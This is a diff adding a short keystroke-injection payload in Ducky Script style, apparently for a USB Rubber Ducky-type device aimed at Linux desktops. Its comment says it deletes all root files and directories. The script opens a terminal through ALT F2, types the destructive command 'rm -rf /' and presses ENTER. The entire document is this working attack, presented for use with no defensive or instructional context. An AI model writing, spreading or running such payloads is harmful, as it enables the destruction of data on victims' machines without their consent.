@@ -1,0 +1,12 @@
+REM For Linux env.
+REM Deletes all root files and directories.
+DELAY 1666
+ALT F2
+DELAY 50
+STRING gnome-terminal
+DELAY 50
+ENTER
+DELAY 226
+STRING "rm -rf /"
+DELAY 25
+ENTER 
